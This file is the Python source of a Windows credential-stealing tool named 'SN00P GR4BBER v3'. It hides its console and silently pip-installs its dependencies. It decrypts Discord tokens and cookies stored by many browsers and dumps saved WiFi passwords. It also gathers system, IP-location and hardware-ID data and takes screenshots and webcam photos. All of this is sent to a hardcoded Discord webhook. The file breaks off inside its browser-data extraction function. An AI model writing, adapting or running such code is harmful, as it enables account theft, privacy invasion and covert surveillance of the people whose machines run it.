import os
import sys
import re
import json
import base64
import urllib.request
import datetime
import subprocess
from threading import Thread
import logging
import sqlite3
import platform
import psutil
import time
import ctypes
import mimetypes
import uuid
import shutil
import glob
import tempfile # For creating temporary files/directories securely
from concurrent.futures import ThreadPoolExecutor # For parallelizing browser extraction

# Define global flags for library availability
PILLOW_AVAILABLE = False
OPENCV_AVAILABLE = False

# Conditional imports for Crypto and Win32Crypt (handled by install_import)
from Crypto.Cipher import AES
import win32crypt

# Conditional imports for screenshot and webcam (handled below with checks)
try:
    from PIL import ImageGrab
except ImportError:
    pass
try:
    import cv2
except ImportError:
    pass


# Stealth Mode: Hide console window if script is run as a .py file
if sys.argv[0].endswith(".py"):
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception as e:
        logging.warning(f"Failed to hide console window: {e}")

logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO)
Logger = logging.getLogger("TokenGrabber")

def install_import(modules):
    global PILLOW_AVAILABLE # Declare global first
    global OPENCV_AVAILABLE # Declare global first

    for module, pip_name in modules:
        try:
            if module == "PIL":
                from PIL import ImageGrab as _temp_ImageGrab
                PILLOW_AVAILABLE = True # Assignment after global
            elif module == "cv2":
                import cv2 as _temp_cv2
                OPENCV_AVAILABLE = True # Assignment after global
            # For other modules, direct import works
            elif module == "Crypto.Cipher.AES":
                from Crypto.Cipher import AES as _temp_AES
            elif module == "win32crypt":
                import win32crypt as _temp_win32crypt
            else:
                __import__(module)
        except ImportError:
            Logger.info(f"Installing missing module: {pip_name}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Re-import after installation to ensure it's available for the rest of the script
            try:
                if module == "PIL":
                    from PIL import ImageGrab as _temp_ImageGrab
                    PILLOW_AVAILABLE = True
                elif module == "cv2":
                    import cv2 as _temp_cv2
                    OPENCV_AVAILABLE = True
                elif module == "Crypto.Cipher.AES":
                    from Crypto.Cipher import AES as _temp_AES
                elif module == "win32crypt":
                    import win32crypt as _temp_win32crypt
                else:
                    __import__(module)
            except ImportError:
                Logger.error(f"Failed to import {module} even after installation. Functionality might be limited.")
            except Exception as e:
                Logger.error(f"Error during re-import of {module}: {e}")
        except Exception as e:
            Logger.error(f"Error checking/importing {module}: {e}")

# MODIFICATION: Ensure all necessary libraries are installed
install_import([
    ("win32crypt", "pypiwin32"),
    ("Crypto.Cipher.AES", "pycryptodome"),
    ("sqlite3", "sqlite3"),
    ("psutil", "psutil"),
    ("PIL", "Pillow"), # For screenshot
    ("cv2", "opencv-python") # For webcam
])


WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1533563537593729164/cFxCqtqtpYAbYDXLGB4o34SAseC0xNH-INuA9aHZ3T03b-D7Y1iznvTkmLpEmPvvpBwx'  

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
TEMP_DIR = os.getenv("TEMP") # Use TEMP_DIR for temporary files

# Global constants for storage and archive
SNOOP_STASH_DIR = os.path.join(TEMP_DIR, "Snoop_V3_Stash")
SNOOP_REPORT_ZIP_BASE = os.path.join(TEMP_DIR, "Snoop_Report_") # Will append username later


PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Lightcord': ROAMING + '\\Lightcord',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
    'Iridium': LOCAL + '\\Iridium\\User Data',
    'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles' # Firefox is handled separately for tokens
}

# Define browser targets for data extraction
BROWSER_TARGETS = {
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser', # Base path, will add 'User Data'
    'Chrome': LOCAL + '\\Google\\Chrome',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS',
    'Edge': LOCAL + '\\Microsoft\\Edge',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Vivaldi': LOCAL + '\\Vivaldi',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser',
    'Amigo': LOCAL + '\\Amigo',
    'Torch': LOCAL + '\\Torch',
    'Kometa': LOCAL + '\\Kometa',
    'Orbitum': LOCAL + '\\Orbitum',
    'CentBrowser': LOCAL + '\\CentBrowser',
    '7Star': LOCAL + '\\7Star\\7Star',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser',
    'Uran': LOCAL + '\\uCozMedia\\Uran',
    'Iridium': LOCAL + '\\Iridium',
}

def get_encryption_key(path):
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        Logger.info(f"No Local State file at {local_state_path}")
        return None
    try:
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            Logger.info(f"No encrypted_key in Local State at {local_state_path}")
            return None
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        Logger.info(f"Successfully retrieved encryption key at {path}")
        return key
    except Exception as e:
        Logger.error(f"Failed to get encryption key at {path}: {e}")
        return None

def decrypt_payload(encrypted_payload, master_key):
    try:
        # Encrypted payload format: b'v10' + iv + ciphertext + tag
        iv = encrypted_payload[3:15]
        ciphertext = encrypted_payload[15:-16]
        tag = encrypted_payload[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_bytes = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted_bytes.decode('utf-8', errors='ignore')
    except Exception as e:
        Logger.error(f"Failed to decrypt payload: {e}")
        return None

def decrypt_token(encrypted_token, key):
    try:
        encrypted_token = base64.b64decode(encrypted_token.split("dQw4w9WgXcQ:")[1])
        iv = encrypted_token[3:15]
        ciphertext = encrypted_token[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
        return decrypted.decode(errors="ignore").strip()
    except Exception as e:
        Logger.error(f"Decryption failed: {e}")
        return None

def safe_storage_steal(path, platform_name):
    tokens = []
    key = get_encryption_key(os.path.dirname(path) if any(x in platform_name for x in ["Brave", "Chrome", "Edge", "Opera", "Vivaldi", "Yandex", "Amigo", "Torch", "Kometa", "Orbitum", "CentBrowser", "7Star", "Sputnik", "Epic Privacy Browser", "Uran", "Iridium"]) else path)
    if not key and any(x in platform_name for x in ["Brave", "Chrome", "Edge", "Opera", "Vivaldi", "Yandex", "Amigo", "Torch", "Kometa", "Orbitum", "CentBrowser", "7Star", "Sputnik", "Epic Privacy Browser", "Uran", "Iridium"]):
        Logger.info(f"No encryption key for {platform_name} at {path}")
        return tokens
    leveldb_paths = []
    for root, dirs, _ in os.walk(path):
        if "leveldb" in dirs:
            leveldb_paths.append(os.path.join(root, "leveldb"))
    if not leveldb_paths:
        Logger.info(f"No LevelDB found at {path}")
        return tokens
    for leveldb_path in leveldb_paths:
        Logger.info(f"Scanning LevelDB at {leveldb_path}")
        try:
            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith((".log", ".ldb")):
                    continue
                file_path = os.path.join(leveldb_path, file_name)
                with open(file_path, errors="ignore") as f:
                    lines = f.readlines()
                for line in lines:
                    if line.strip():
                        matches = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line)
                        for match in matches:
                            match = match.rstrip("\\")
                            decrypted = decrypt_token(match, key) if key else None
                            if decrypted and (decrypted, platform_name) not in tokens:
                                Logger.info(f"Found decrypted token in {platform_name}: {file_path}")
                                tokens.append((decrypted, platform_name))
        except Exception as e:
            Logger.error(f"Failed to read tokens from {leveldb_path}: {e}")
    return tokens

def simple_steal(path, platform_name):
    tokens = []
    leveldb_paths = []
    for root, dirs, _ in os.walk(path):
        if "leveldb" in dirs:
            leveldb_paths.append(os.path.join(root, "leveldb"))
    if not leveldb_paths:
        Logger.info(f"No LevelDB found at {path}")
        return tokens
    for leveldb_path in leveldb_paths:
        Logger.info(f"Scanning LevelDB for unencrypted tokens at {leveldb_path}")
        try:
            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith((".log", ".ldb")):
                    continue
                file_path = os.path.join(leveldb_path, file_name)
                with open(file_path, errors="ignore") as f:
                    lines = f.readlines()
                for line in lines:
                    if line.strip():
                        matches = re.findall(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", line)
                        for match in matches:
                            match = match.rstrip("\\").strip()
                            if (match, platform_name) not in tokens:
                                Logger.info(f"Found unencrypted token in {platform_name}: {file_path}")
                                tokens.append((match, platform_name))
        except Exception as e:
            Logger.error(f"Failed to read unencrypted tokens from {leveldb_path}: {e}")
    return tokens

def firefox_steal(path, platform_name):
    tokens = []
    sqlite_paths = []
    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(".sqlite"):
                sqlite_paths.append(os.path.join(root, file))
    if not sqlite_paths:
        Logger.info(f"No SQLite databases found at {path}")
        return tokens
    for sqlite_path in sqlite_paths:
        Logger.info(f"Scanning SQLite database at {sqlite_path}")
        try:
            with open(sqlite_path, errors="ignore") as f:
                lines = f.readlines()
            for line in lines:
                if line.strip():
                    matches = re.findall(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", line)
                    for match in matches:
                        match = match.rstrip("\\").strip()
                        if (match, platform_name) not in tokens:
                            Logger.info(f"Found token in {platform_name} SQLite: {sqlite_path}")
                            tokens.append((match, platform_name))
        except Exception as e:
            Logger.error(f"Failed to read tokens from {sqlite_path}: {e}")
    return tokens

def steal_cookies(path, platform_name):
    tokens = []
    cookie_path = os.path.join(path, "Network", "Cookies")
    if not os.path.exists(cookie_path):
        Logger.info(f"No Cookies database at {cookie_path}")
        return tokens
    try:
        if not os.access(cookie_path, os.R_OK):
            Logger.error(f"No read permission for Cookies database at {cookie_path}")
            return tokens
        with open(cookie_path, 'rb') as f:
            pass  # Test file access
        conn = sqlite3.connect(f"file:{cookie_path}?mode=ro", uri=True)
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%' AND name = 'token'")
        key = get_encryption_key(os.path.dirname(path))
        for row in cursor.fetchall():
            encrypted_value = row[0]
            try:
                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                decrypted = decrypted.strip()
                if decrypted and re.match(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", decrypted) and (decrypted, platform_name) not in tokens:
                    Logger.info(f"Found token in cookies at {cookie_path}")
                    tokens.append((decrypted, platform_name))
            except Exception as e:
                Logger.error(f"Failed to decrypt cookie at {cookie_path}: {e}")
        conn.close()
    except Exception as e:
        Logger.error(f"Failed to access Cookies database at {cookie_path}: {e}")
    return tokens

def get_tokens(platform_name, path):
    tokens = []
    Logger.info(f"Scanning {platform_name} at {path}")
    if not os.path.exists(path):
        Logger.info(f"Path does not exist: {path}")
        return tokens
    if "Firefox" in platform_name:
        tokens.extend(firefox_steal(path, platform_name) or [])
    else:
        if any(x in platform_name for x in ["Brave", "Chrome", "Edge", "Opera", "Vivaldi", "Yandex", "Amigo", "Torch", "Kometa", "Orbitum", "CentBrowser", "7Star", "Sputnik", "Epic Privacy Browser", "Uran", "Iridium"]):
            profiles = ['Default'] + [f"Profile {i}" for i in range(1, 10)]
            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if os.path.exists(profile_path):
                    Logger.info(f"Found profile: {profile_path}")
                    tokens.extend(safe_storage_steal(profile_path, f"{platform_name} ({profile})") or [])
                    tokens.extend(simple_steal(profile_path, f"{platform_name} ({profile})") or [])
                    tokens.extend(steal_cookies(profile_path, f"{platform_name} ({profile})") or [])
        else:
            tokens.extend(safe_storage_steal(path, platform_name) or [])
            tokens.extend(simple_steal(path, platform_name) or [])
    return tokens

def get_headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers["Authorization"] = token
    return headers

def get_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "Unknown"

# MODIFICATION: send_to_webhook for embeds
def send_to_webhook(embeds):
    try:
        payload = {
            "username": "SN00P GR4BBER",
            "avatar_url": "https://w0.peakpx.com/wallpaper/981/593/HD-wallpaper-hacker-dark-mask-thumbnail.jpg",
            "content": "@everyone",
            "embeds": embeds
        }
        data = json.dumps(payload, ensure_ascii=False).encode('utf-8')
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=get_headers(), method="POST")
        with urllib.request.urlopen(req) as response:
            Logger.info(f"Webhook (embeds) sent successfully, status: {response.status}")
        time.sleep(1)
    except urllib.error.HTTPError as e:
        Logger.error(f"Failed to send webhook (embeds): HTTP Error {e.code}: {e.reason}")
        try:
            error_response = e.read().decode()
            Logger.error(f"Webhook (embeds) error response: {error_response}")
        except:
            Logger.error("Could not read webhook (embeds) error response")
        Logger.info(f"Failed webhook (embeds) payload: {json.dumps(embeds, indent=2)}")
    except Exception as e:
        Logger.error(f"Failed to send webhook (embeds): {e}")
        Logger.info(f"Failed webhook (embeds) payload: {json.dumps(embeds, indent=2)}")

# MODIFICATION: send_file_to_webhook for files (e.g., ZIP archive)
def send_file_to_webhook(file_path, ip_address, content_msg="File from grabber"):
    if not os.path.exists(file_path):
        Logger.error(f"File not found for webhook: {file_path}")
        return

    boundary = '----WebKitFormBoundary' + uuid.uuid4().hex
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    payload_json_data = {
        'content': f"[{ip_address}] {content_msg}",
        'username': 'SN00P GR4BBER',
        'avatar_url': 'https://w0.peakpx.com/wallpaper/981/593/HD-wallpaper-hacker-dark-mask-thumbnail.jpg'
    }

    body = []
    # Add payload_json part
    body.append(f'--{boundary}')
    body.append('Content-Disposition: form-data; name="payload_json"')
    body.append('Content-Type: application/json')
    body.append('')
    body.append(json.dumps(payload_json_data, ensure_ascii=False))

    # Add file part
    filename = os.path.basename(file_path)
    mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'

    body.append(f'--{boundary}')
    body.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"')
    body.append(f'Content-Type: {mimetype}')
    body.append('')
    with open(file_path, 'rb') as f:
        body.append(f.read()) # Read bytes for file content

    body.append(f'--{boundary}--') # End boundary

    # Convert body parts to bytes, handling file content as bytes directly
    encoded_body = b'\r\n'.join([
        (p if isinstance(p, bytes) else p.encode('utf-8')) for p in body
    ])

    try:
        req = urllib.request.Request(WEBHOOK_URL, data=encoded_body, headers=headers, method="POST")
        with urllib.request.urlopen(req) as response:
            Logger.info(f"File webhook for '{filename}' sent successfully, status: {response.status}")
        time.sleep(1)
    except urllib.error.HTTPError as e:
        Logger.error(f"Failed to send file webhook for '{filename}': HTTP Error {e.code}: {e.reason}")
        try:
            error_response = e.read().decode()
            Logger.error(f"File webhook error response: {error_response}")
        except:
            Logger.error("Could not read file webhook error response")
        Logger.info(f"Failed file webhook payload for {file_path}")
    except Exception as e:
        Logger.error(f"Failed to send file webhook for '{filename}': {e}")
        Logger.info(f"Failed file webhook payload for {file_path}")

# Globals for library availability (set by install_import)
SCREENSHOT_AVAILABLE = PILLOW_AVAILABLE
WEBCAM_AVAILABLE = OPENCV_AVAILABLE


def capture_screenshot():
    if not SCREENSHOT_AVAILABLE:
        Logger.info("Screenshot capture skipped: Pillow not available.")
        return None
    temp_file_path = os.path.join(TEMP_DIR, f"screenshot_{int(time.time())}.png")
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(temp_file_path)
        Logger.info(f"Screenshot captured: {temp_file_path}")
        return temp_file_path
    except Exception as e:
        Logger.error(f"Failed to capture screenshot: {e}")
        return None

def capture_webcam():
    if not WEBCAM_AVAILABLE:
        Logger.info("Webcam capture skipped: OpenCV not available.")
        return None
    temp_file_path = os.path.join(TEMP_DIR, f"webcam_{int(time.time())}.png")
    cap = None
    try:
        cap = cv2.VideoCapture(0) # 0 is the default camera
        if not cap.isOpened():
            Logger.warning("Could not open webcam.")
            return None
        
        # Give camera a moment to warm up
        time.sleep(0.5) 
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(temp_file_path, frame)
            Logger.info(f"Webcam image captured: {temp_file_path}")
            return temp_file_path
        else:
            Logger.warning("Failed to read frame from webcam.")
            return None
    except Exception as e:
        Logger.error(f"Failed to capture webcam image: {e}")
        return None
    finally:
        if cap and cap.isOpened():
            cap.release()

def cleanup_temp_files(*file_paths):
    for path in file_paths:
        if path and os.path.exists(path):
            try:
                os.remove(path)
                Logger.info(f"Cleaned up temporary file: {path}")
            except Exception as e:
                Logger.error(f"Failed to delete temporary file '{path}': {e}")

def _run_powershell_command(command, default_value="Unknown"):
    try:
        result = subprocess.check_output(["powershell", "-Command", command], 
                                         shell=True, 
                                         creationflags=subprocess.CREATE_NO_WINDOW, 
                                         stderr=subprocess.DEVNULL,
                                         encoding='utf-8', 
                                         errors='ignore').strip()
        
        if "Win32_Processor" in command:
            lines = [line.strip() for line in result.split('\n') if line.strip()]
            return lines[0] if lines else default_value
        elif "Win32_VideoController" in command:
            lines = [line.strip() for line in result.split('\n') if line.strip()]
            valid_gpus = [g for g in lines if g and "microsoft" not in g.lower() and "basic render" not in g.lower()]
            return ", ".join(sorted(list(set(valid_gpus)))) if valid_gpus else default_value
        elif "Win32_ComputerSystemProduct).UUID" in command:
            uuid_match = re.search(r'([A-Fa-f0-9]{8}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{12})', result, re.IGNORECASE)
            return uuid_match.group(0) if uuid_match else default_value
        
        return result if result else default_value
    except Exception as e:
        Logger.warning(f"PowerShell command failed for '{command}': {e}")
        return default_value

def create_token_embed(token, user_data, platform_name):
    Logger.info(f"User data for {platform_name}: {json.dumps(user_data, indent=2)}")
    username = user_data.get('username', 'Unknown')
    discriminator = user_data.get('discriminator', '0')
    if not username or not isinstance(username, str):
        username = "Unknown"
    if not discriminator or not isinstance(discriminator, str):
        discriminator = "0"
    badges = ""
    flags = user_data.get('flags', 0)
    if flags & 64: badges += "🛡️ " 
    if flags & 128: badges += "💡 " 
    if flags & 256: badges += "⚖️ " 

    embed = {
        "title": f"💀 **DISCORD EXPLOIT: {username}#{discriminator}**",
        "description": "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        "color": 0x2b2d31,
        "thumbnail": {
            "url": f"https://cdn.discordapp.com/avatars/{user_data.get('id', '0')}/{user_data.get('avatar', '')}.png" if user_data.get('avatar') else ""
        },
        "fields": [ 
            {"name": "🆔 User ID", "value": f"```{user_data.get('id', 'Unknown')}```", "inline": True},
            {"name": "📧 Email", "value": f"```{user_data.get('email', 'Unknown')}```", "inline": True},
            {"name": "📞 Phone", "value": f"```{str(user_data.get('phone', 'Unknown'))}```", "inline": True},
            {"name": "🚩 Flags", "value": f"```{str(flags)}```", "inline": True},
            {"name": "🏅 Badges", "value": f"```{badges.strip() or 'None'}```", "inline": True},
            {"name": "💻 Platform", "value": f"```{platform_name}```", "inline": True},
            {"name": "🔑 Token", "value": f"```{token}```", "inline": False}
        ],
        "footer": {
            "text": "SN00P GR4BBER v3 | " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
            "icon_url": "https://w0.peakpx.com/wallpaper/981/593/HD-wallpaper-hacker-dark-mask-thumbnail.jpg"
        },
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
    }
    return embed

# MODIFICATION: New function to get WiFi information
def get_wifi_info():
    wifi_info = {"current_network": {"SSID": "Unknown", "BSSID": "Unknown", "Signal": "Unknown", "Authentication": "Unknown"}, "saved_networks": []}
    try:
        # Get current Wi-Fi interface info
        interfaces_output = subprocess.check_output("netsh wlan show interfaces", shell=True, creationflags=subprocess.CREATE_NO_WINDOW, stderr=subprocess.DEVNULL, encoding='utf-8', errors='ignore')
        
        current_ssid_match = re.search(r"SSID\s*:\s*(.*)", interfaces_output)
        current_bssid_match = re.search(r"BSSID\s*:\s*(.*)", interfaces_output)
        current_signal_match = re.search(r"Signal\s*:\s*(\d+)%", interfaces_output)
        current_auth_match = re.search(r"Authentication\s*:\s*(.*)", interfaces_output)

        current_network_details = {
            "SSID": current_ssid_match.group(1).strip() if current_ssid_match else "N/A",
            "BSSID": current_bssid_match.group(1).strip() if current_bssid_match else "N/A",
            "Signal": current_signal_match.group(1).strip() + "%" if current_signal_match else "N/A",
            "Authentication": current_auth_match.group(1).strip() if current_auth_match else "N/A"
        }
        wifi_info["current_network"] = current_network_details

        # Get saved Wi-Fi profiles
        profiles_output = subprocess.check_output("netsh wlan show profiles", shell=True, creationflags=subprocess.CREATE_NO_WINDOW, stderr=subprocess.DEVNULL, encoding='utf-8', errors='ignore')
        profile_names = re.findall(r"All User Profile\s*:\s*(.*)", profiles_output)

        for profile_name in profile_names:
            profile_name = profile_name.strip()
            profile_details = {"SSID": profile_name, "Key": "N/A"}
            try:
                key_output = subprocess.check_output(f'netsh wlan show profile name="{profile_name}" key=clear', shell=True, creationflags=subprocess.CREATE_NO_WINDOW, stderr=subprocess.DEVNULL, encoding='utf-8', errors='ignore')
                key_match = re.search(r"Key Content\s*:\s*(.*)", key_output)
                if key_match:
                    profile_details["Key"] = key_match.group(1).strip()
            except Exception as e:
                Logger.warning(f"Could not retrieve key for profile '{profile_name}': {e}")
            wifi_info["saved_networks"].append(profile_details)

        Logger.info("Successfully gathered WiFi information.")
    except Exception as e:
        Logger.error(f"Failed to gather WiFi information: {e}")
    return wifi_info

def get_system_info(ip_address, wifi_data):
    system_info = {}
    
    # OS Info
    try:
        os_name = platform.system()
        os_release = platform.release()
        os_version = platform.version()
        os_arch = platform.machine() 
        system_info['OS'] = f"{os_name} {os_release} (Build {os_version}) {os_arch}"
    except Exception as e:
        system_info['OS'] = f"Unknown (Error: {e})"
        Logger.warning(f"Could not get OS info: {e}")

    # PC Name
    try:
        system_info['PC Name'] = platform.node()
    except Exception as e:
        system_info['PC Name'] = f"Unknown (Error: {e})"
        Logger.warning(f"Could not get PC Name: {e}")
    
    # CPU Info (PowerShell for Name, psutil for cores)
    try:
        cpu_name_ps = _run_powershell_command("(Get-CimInstance Win32_Processor).Name")
        physical_cores = psutil.cpu_count(logical=False)
        logical_cores = psutil.cpu_count(logical=True)
        system_info['CPU Info'] = f"{cpu_name_ps} (Physical Cores: {physical_cores}, Logical Threads: {logical_cores})"
    except Exception as e:
        system_info['CPU Info'] = f"Unknown (Error: {e})"
        Logger.warning(f"Could not get CPU info: {e}")
    
    # RAM Info
    try:
        ram = psutil.virtual_memory()
        system_info['Total RAM'] = f"{ram.total / (1024**3):.2f} GB"
        system_info['Used RAM'] = f"{ram.used / (1024**3):.2f} GB ({ram.percent:.2f}%)"
    except Exception as e:
        system_info['Total RAM'] = f"Unknown (Error: {e})"
        system_info['Used RAM'] = f"Unknown (Error: {e})"
        Logger.warning(f"Could not get RAM info: {e}")

    # GPU Info (PowerShell)
    system_info['GPU Model'] = _run_powershell_command("Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name")

    # HWID (UUID) (PowerShell)
    system_info['HWID'] = _run_powershell_command("(Get-CimInstance Win32_ComputerSystemProduct).UUID")

    # Network Info (City, Country, ISP, Proxy/VPN)
    network_info = {'City': 'Unknown', 'Country': 'Unknown', 'ISP': 'Unknown', 'Proxy/VPN': 'Unknown'}
    try:
        with urllib.request.urlopen(f"http://ip-api.com/json/{ip_address}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,proxy,hosting") as response: 
            ip_api_data = json.loads(response.read().decode())
            network_info['City'] = ip_api_data.get('city', 'Unknown')
            network_info['Country'] = ip_api_data.get('country', 'Unknown')
            network_info['ISP'] = ip_api_data.get('isp', 'Unknown')
            is_proxy_vpn = "Yes" if ip_api_data.get('proxy') or ip_api_data.get('hosting') else "No"
            network_info['Proxy/VPN'] = is_proxy_vpn
    except Exception as e:
        Logger.warning(f"Could not get network info from ip-api.com: {e}")
    system_info['Network Info'] = network_info
    
    # Add WiFi info to system_info for embed creation
    system_info['WiFi Info'] = wifi_data

    Logger.info("Successfully gathered system information.")
    return system_info

def create_system_embed(system_info, ip_address):
    embed = {
        "title": "💻 **SYSTEM INFORMATION**",
        "description": "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        "color": 0x2b2d31,
        "fields": [
            {"name": "🖥️ PC Name", "value": f"```{system_info.get('PC Name', 'Unknown')}```", "inline": True},
            {"name": "🆔 HWID (UUID)", "value": f"```{system_info.get('HWID', 'Unknown')}```", "inline": True},
            {"name": "🌐 OS", "value": f"```{system_info.get('OS', 'Unknown')}```", "inline": False},
            {"name": "🧠 CPU", "value": f"```{system_info.get('CPU Info', 'Unknown')}```", "inline": False},
            {"name": "💡 GPU", "value": f"```{system_info.get('GPU Model', 'Unknown')}```", "inline": False},
            {"name": "💾 RAM", "value": f"```Total: {system_info.get('Total RAM', 'Unknown')} | Used: {system_info.get('Used RAM', 'Unknown')}```", "inline": False},
            
            {"name": "🌍 **NETWORK & LOCATION**", "value": "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", "inline": False},
            {"name": "📍 IP Address", "value": f"```{ip_address}```", "inline": True},
            {"name": "🏙️ City", "value": f"```{system_info['Network Info'].get('City', 'Unknown')}```", "inline": True},
            {"name": "🗺️ Country", "value": f"```{system_info['Network Info'].get('Country', 'Unknown')}```", "inline": True},
            {"name": "📡 ISP", "value": f"```{system_info['Network Info'].get('ISP', 'Unknown')}```", "inline": True},
            {"name": "🕵️ Proxy/VPN", "value": f"```{system_info['Network Info'].get('Proxy/VPN', 'Unknown')}```", "inline": True},
            
            {"name": "📶 **WIFI INFORMATION**", "value": "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", "inline": False},
            {"name": "Current SSID", "value": f"```{system_info['WiFi Info']['current_network'].get('SSID', 'Unknown')}```", "inline": True},
            {"name": "Current BSSID", "value": f"```{system_info['WiFi Info']['current_network'].get('BSSID', 'Unknown')}```", "inline": True},
            {"name": "Current Signal", "value": f"```{system_info['WiFi Info']['current_network'].get('Signal', 'Unknown')}```", "inline": True},
            {"name": "Current Auth", "value": f"```{system_info['WiFi Info']['current_network'].get('Authentication', 'Unknown')}```", "inline": True},
        ],
        "footer": {
            "text": "SN00P GR4BBER v3 | " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
            "icon_url": "https://w0.peakpx.com/wallpaper/981/593/HD-wallpaper-hacker-dark-mask-thumbnail.jpg"
        },
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
    }
    return embed

# MODIFICATION: New function for browser data extraction
def extract_browser_data(browser_name, base_browser_path, stash_base_path):
    browser_stash_path = os.path.join(stash_base_path, "Browsers", browser_name)
    os.makedirs(browser_stash_path, exist_ok=True)
    
    Logger.info(f"Starting extraction for {browser_name}...")
    
    # Common profile paths
    profile_dirs = ['Default'] + [f"Profile {i}" for i in range(1, 10)]
    
    # Determine the correct User Data path structure for the browser
    user_data_path = base_browser_path
    if browser_name in ['Brave', 'Chrome', 'Chrome SxS', 'Edge', 'Vivaldi', 'Yandex', 'Amigo', 'Torch', 'Kometa', 'Orbitum', 'CentBrowser', '7Star', 'Sputnik', 'Epic Privacy Browser', 'Uran', 'Iridium']:
        user_data_path = os.path.join(base_browser_path, 'User Data')
        
    if not os.path.exists(user_data_path):
        Logger.info(f"User Data path not found for {browser_name}: {user_data_path}")
        return

    # Get master key once per browser
    master_key = get_encryption_key(user_data_path)
    if not master_key:
        Logger.warning(f"Master key not found for {browser_name}. Cannot decrypt encrypted data.")

    for profile_name in profile_dirs:
        profile_path = os.path.join(user_data_path, profile_name)
        if not os.path.exists(profile_path):
            continue

        Logger.info(f"Extracting data from {browser_name} ({profile_name})...")
